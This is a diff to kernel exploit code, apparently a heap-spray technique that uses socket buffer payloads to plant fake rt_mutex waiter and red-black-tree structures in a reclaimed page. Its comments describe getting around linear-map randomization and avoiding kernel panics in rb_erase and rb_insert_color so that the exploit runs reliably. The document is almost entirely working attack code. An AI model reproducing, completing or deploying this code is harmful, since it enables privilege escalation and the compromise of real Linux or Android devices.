@@ -491,12 +491,21 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   uint64_t task_group = text_addr(ROOT_TASK_GROUP);
   uint64_t pi_top_task = text_addr(INIT_TASK);
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-    write_pc = SLIDE_LOGGERS_0_1;
+    /* Runtime linear-map base is randomized (page=0xffffff88xxxxxxxx while
+     * build-time constants assume 0xffffff80xxxxxxxx) — every SLIDE_* address
+     * is unmapped at runtime and any dereference panics (observed in
+     * rb_erase -> rb_next reading waiter->tree_entry.parent). Keep the whole
+     * fake graph self-contained inside the reclaimed page. */
+    uintptr_t fake_right_zone = payload_base + RIGHT_OFF;
+    uintptr_t fake_left_zone = payload_base + LEFT_OFF;
+    write_pc = fake_right_zone;
     write_right = 0;
-    write_left = SLIDE_RANDOM_BOOT_ID_DATA;
-    waiter_task = SLIDE_INIT_TASK;
-    task_group = SLIDE_ROOT_TASK_GROUP;
-    pi_top_task = SLIDE_INIT_TASK;
+    write_left = 0;
+    waiter_task = fake_task;
+    task_group = fake_task;
+    pi_top_task = fake_task;
+    fake_parent = fake_right_zone;
+    fake_right = fake_left_zone;
   }
 
   for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
@@ -518,7 +527,11 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       put64(p, LOCK_OFF + 0x18, fake_task | 1);
     }
 
-    put64(p, W0_OFF + 0x00, 1);
+    /* tree_entry.parent_color: 0 = parent NULL + BLACK. As the waiters-tree
+     * root it must be BLACK, otherwise re-inserting the RED stack waiter
+     * under it triggers the red-red case in rb_insert_color which reads
+     * gparent->rb_right with gparent==NULL -> panic. */
+    put64(p, W0_OFF + 0x00, 0);
     put64(p, W0_OFF + 0x08, 0);
     put64(p, W0_OFF + 0x10, 0);
     put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
